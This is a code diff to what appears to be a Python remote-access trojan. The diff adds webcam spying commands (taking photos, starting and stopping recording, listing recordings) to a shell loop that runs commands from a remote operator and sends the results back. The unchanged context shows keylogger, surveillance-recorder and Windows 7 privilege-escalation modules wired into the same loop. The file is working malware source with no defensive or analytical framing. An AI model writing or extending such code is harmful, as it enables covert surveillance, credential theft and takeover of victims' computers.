@@ -14,6 +14,7 @@ import os  # For interacting with the operating system
 keylogger = None
 recorder = None  
 privilege_escalator = None
+camera = None
 
 import sys
 import os
@@ -27,6 +28,7 @@ if current_dir not in sys.path:
 from features.keylogger import create_keylogger
 from features.recording import create_surveillance_recorder
 from features.privilege import Windows7PrivilegeEscalator
+from features.camera import create_camera_surveillance
 
 
 # Function to send data in a reliable way (encoded as JSON)
@@ -87,7 +89,7 @@ def download_file(file_name):
 
 # Main shell function for command execution with enhanced features
 def shell():
-    global keylogger, recorder, privilege_escalator
+    global keylogger, recorder, privilege_escalator, camera
     
     while True:
         # Receive a command from the remote host
@@ -180,6 +182,53 @@ def shell():
                 reliable_send("Recordings: " + json.dumps(recordings, indent=2))
             except Exception as e:
                 reliable_send("List recordings error: " + str(e))
+                
+        # CAMERA COMMANDS
+        elif command == 'camera_photo':
+            try:
+                if camera is None:
+                    camera = create_camera_surveillance("recordings")
+                success, msg = camera.take_snapshot()
+                reliable_send("Camera Photo: " + msg)
+            except Exception as e:
+                reliable_send("Camera photo error: " + str(e))
+                
+        elif command == 'start_camera_recording':
+            try:
+                if camera is None:
+                    camera = create_camera_surveillance("recordings")
+                success, msg = camera.start_surveillance(duration=30)
+                reliable_send("Camera Recording: " + msg)
+            except Exception as e:
+                reliable_send("Camera recording error: " + str(e))
+                
+        elif command == 'stop_camera_recording':
+            try:
+                if camera:
+                    success, msg = camera.stop_surveillance()
+                    reliable_send("Stop Camera: " + msg)
+                else:
+                    reliable_send("No camera recording active")
+            except Exception as e:
+                reliable_send("Stop camera error: " + str(e))
+                
+        elif command == 'camera_status':
+            try:
+                if camera is None:
+                    camera = create_camera_surveillance("recordings")
+                status = camera.get_system_status()
+                reliable_send("Camera Status: " + json.dumps(status, indent=2))
+            except Exception as e:
+                reliable_send("Camera status error: " + str(e))
+                
+        elif command == 'list_camera_recordings':
+            try:
+                if camera is None:
+                    camera = create_camera_surveillance("recordings")
+                recordings = camera.list_recordings()
+                reliable_send("Camera Recordings: " + json.dumps(recordings, indent=2))
+            except Exception as e:
+                reliable_send("List camera recordings error: " + str(e))
                 
         # PRIVILEGE ESCALATION COMMANDS
         elif command == 'check_privs':
